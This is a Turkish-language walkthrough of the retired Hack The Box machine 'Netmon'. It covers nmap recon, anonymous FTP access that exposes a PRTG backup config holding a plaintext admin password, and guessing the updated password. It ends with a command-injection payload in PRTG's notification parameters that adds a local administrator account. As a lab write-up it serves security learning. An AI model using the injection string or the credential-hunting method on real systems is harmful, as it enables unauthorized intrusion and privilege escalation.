---
{"dg-publish":true,"permalink":"/ctf/netmon-ctf/"}
---

Netmon, şimdiye kadar yaptığım en kısa kutular arasında Jerry ve Blue ile yarışıyor. Kullanıcı ilk kanı 2 dakikadan kısa sürede alındı ve bu süre muhtemelen daha da kısa olabilirdi, çünkü Hack The Box sayfası açıldığı anda birçok kişi bayrak göndermeye çalışırken çöktü.

Sunucu, anonim FTP üzerinden tüm dosya sistemini sunuyor, bu da kullanıcı bayrağını almak için yeterli. Ayrıca, 80. port üzerinde bir PRTG Network Monitor örneği barındırıyor. FTP erişimini kullanarak eski kimlik bilgilerini bir yedek yapılandırma dosyasında bulacağım ve bunları mevcut kimlik bilgilerini tahmin etmek için kullanacağım. Daha sonra, PRTG içindeki bir komut enjeksiyonu güvenlik açığından yararlanarak SYSTEM yetkileriyle bir reverse shell alıp root bayrağını ele geçireceğim.


## Box Info

|Name|[Netmon](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Fnetmon)[![Netmon](https://0xdf.gitlab.io/icons/box-netmon.png)](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Fnetmon)  <br>[Play on HackTheBox](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Fnetmon)|
|---|---|
|Release Date|[02 Mar 2019](https://twitter.com/hackthebox_eu/status/1101032274592706565)|
|Retire Date|29 Jun 2019|
|OS|Windows ![Windows](https://0xdf.gitlab.io/icons/Windows.png)|
|Base Points|Easy [20]|
|Rated Difficulty|![Rated difficulty for Netmon](https://0xdf.gitlab.io/img/netmon-diff.png)|
|Radar Graph|![Radar chart for Netmon](https://0xdf.gitlab.io/img/netmon-radar.png)|
|![First Blood User](https://0xdf.gitlab.io/icons/first-blood-user.png)|00:01:53[![Baku](https://www.hackthebox.com/badge/image/80475)](https://app.hackthebox.com/users/80475)|
|![First Blood Root](https://0xdf.gitlab.io/icons/first-blood-root.png)|00:54:48[![snowscan](https://www.hackthebox.com/badge/image/9267)](https://app.hackthebox.com/users/9267)|
|Creator|[![mrb3n](https://www.hackthebox.com/badge/image/2984)](https://app.hackthebox.com/users/2984)|

## Recon

### nmap

![Pasted image 20250208143525.png](/img/user/resimler/Pasted%20image%2020250208143525.png)

```
nmap -sV -sC -p 21,80,135,139,445,5985 10.10.10.152
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 06:38 EST
Nmap scan report for 10.10.10.152
Host is up (0.82s latency).

PORT     STATE SERVICE      VERSION
21/tcp   open  ftp          Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-02-19  11:18PM                 1024 .rnd
| 02-25-19  09:15PM       <DIR>          inetpub
| 07-16-16  08:18AM       <DIR>          PerfLogs
| 02-25-19  09:56PM       <DIR>          Program Files
| 02-02-19  11:28PM       <DIR>          Program Files (x86)
| 02-03-19  07:08AM       <DIR>          Users
|_11-10-23  09:20AM       <DIR>          Windows
80/tcp   open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: PRTG/18.1.37.13946
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-02-08T11:38:31
|_  start_date: 2025-02-08T11:28:14
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.28 seconds
```

### HTTP - PRTG Network Monitor - TCP 80

Sayfa, PRTG Network Monitor'ün (NETMON) bir örneğidir:

![Pasted image 20250208144033.png](/img/user/resimler/Pasted%20image%2020250208144033.png)

Bu aşamada kimlik bilgileri olmadan, [varsayılan](https://www.cleancss.com/router-default/PRTG/PRTG_Network_Monitor) kimlik bilgileri olan 'prtgadmin'/'prtgadmin' ile deneme yapacağım. Eğer bu bilgiler çalışmazsa, FTP'ye geçeceğim

### FTP - TCP 21

#### Login

FTP anonim girişe izin verdiğinden, kontrol edip ne bulabileceğime bakacağım:

![Pasted image 20250208144323.png](/img/user/resimler/Pasted%20image%2020250208144323.png)


#### user.txt

FTP root'u C:\ gibi görünüyor. Buradan user.txt dosyasını alabilirim:

![Pasted image 20250208144503.png](/img/user/resimler/Pasted%20image%2020250208144503.png)


#### PRTG Network Monitor

"**\ProgramData\Paessler\PRTG Network Monitor** dizininde, PRTG Network Monitor uygulamasıyla ilgili bilgileri bulacağım."

```
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-02-19  11:40PM       <DIR>          Configuration Auto-Backups
03-04-19  12:44PM       <DIR>          Log Database
02-02-19  11:18PM       <DIR>          Logs (Debug)
02-02-19  11:18PM       <DIR>          Logs (Sensors)
02-02-19  11:18PM       <DIR>          Logs (System)
03-04-19  12:44PM       <DIR>          Logs (Web Server)
03-04-19  12:49PM       <DIR>          Monitoring Database
02-25-19  09:54PM              1189697 PRTG Configuration.dat
03-04-19  01:24PM              1227115 PRTG Configuration.old
07-14-18  02:13AM              1153755 PRTG Configuration.old.bak
03-04-19  01:25PM              1672215 PRTG Graph Data Cache.dat
02-25-19  10:00PM       <DIR>          Report PDFs
02-02-19  11:18PM       <DIR>          System Information Database
02-02-19  11:40PM       <DIR>          Ticket Database
02-02-19  11:18PM       <DIR>          ToDo Database
226 Transfer complete.
```

Üç config (yapılandırma) dosyasını alıp inceleyeceğim. **.dat** dosyası ve **.old** dosyasında şifrelerin olabileceği kısımlara baktığımda, genellikle şu şekilde görünür:

```
wget ftp://anonymous:anonymous@10.10.10.152/ProgramData/Paessler/PRTG\ Network\ Monitor/PRTG\ Configuration.old.bak
```

![Pasted image 20250208150306.png](/img/user/resimler/Pasted%20image%2020250208150306.png)


```
            <dbpassword>
              <flags>
                <encrypted/>
              </flags>
            </dbpassword>
```

Ancak, PRTG Configuration.old.bak dosyasında şunu buldum:

```
            <dbpassword>
              <!-- User: prtgadmin -->
              PrTg@dmin2018
            </dbpassword>
```


## Shell as SYSTEM

### Log In

Artık kimlik bilgilerine sahibim, bu yüzden giriş yapmayı deneyebilirim. Ne yazık ki, **.bak** dosyasından alınan kimlik bilgilerini denediğimde şu sonuç dönüyor:


![Pasted image 20250208144910.png](/img/user/resimler/Pasted%20image%2020250208144910.png)

Ancak biraz düşününce, kimlik bilgileri eski bir dosyanın yedeğinden alınmış ve **2018** ile bitiyor. **2019**'u deneyeceğim ve bu işe yarıyor, beni Sistem Yöneticisi için PRTG panosuna yönlendiriyor:

![Pasted image 20250208145109.png](/img/user/resimler/Pasted%20image%2020250208145109.png)

### Command Injection

2018 yazında PRTG'deki komut enjeksiyonu (command injection) hakkında bir [blog](https://codewatch.org/2018/06/25/prtg-18-2-39-command-injection-vulnerability/) yazısı var. Bu komut enjeksiyonu, bildirim yapılandırmasındaki parametreler alanında, bazı varsayılan Demo scriptleriye birlikte bulunuyor. Birçok kullanışlı karakter filtrelenmiş olsa da, yazıda bahsedilen kişi, hesaba yeni bir kullanıcı eklemek için enjeksiyon yapmayı başarmış.

Ben de bu blog yazısını takip ederek, **Kurulum > Hesap Ayarları > Bildirimler** bölümüne gideceğim:

En sağdaki **artı (+) butonuna** tıklayıp, ardından **'Yeni Bildirim Ekle'** seçeneğini seçeceğim. Diğer tüm ayarları değiştirmeden bırakıp, en aşağıya kaydırarak **'Program Çalıştır'** seçeneğini seçeceğim. Enjeksiyon, **Parametreler** alanında gerçekleşiyor. Program dosyası olarak **demo ps1 dosyasını** seçip, ardından şu komutu gireceğim:

```
test.txt;net user anon p3nT3st! /add;net localgroup administrators anon /add
```

![Pasted image 20250208151528.png](/img/user/resimler/Pasted%20image%2020250208151528.png)

Kaydet'e tıkladığımda, bildirimler listesinin başına geri dönüyorum. Yeni bildirimimin yanındaki kutuya tıklayıp, ardından üstteki çan simgesine tıklayarak bildirimi test edeceğim.

![Pasted image 20250208151547.png](/img/user/resimler/Pasted%20image%2020250208151547.png)

I get this:

![Pasted image 20250208151643.png](/img/user/resimler/Pasted%20image%2020250208151643.png)

Birkaç saniye bekledikten sonra, yeni kullanıcımla smbmap'i çalıştıracağım ve tam erişimim olduğunu göreceğim:

![Pasted image 20250208151902.png](/img/user/resimler/Pasted%20image%2020250208151902.png)
![Pasted image 20250208151909.png](/img/user/resimler/Pasted%20image%2020250208151909.png)

### Shell

![Pasted image 20250208152527.png](/img/user/resimler/Pasted%20image%2020250208152527.png)

![Pasted image 20250208152514.png](/img/user/resimler/Pasted%20image%2020250208152514.png)

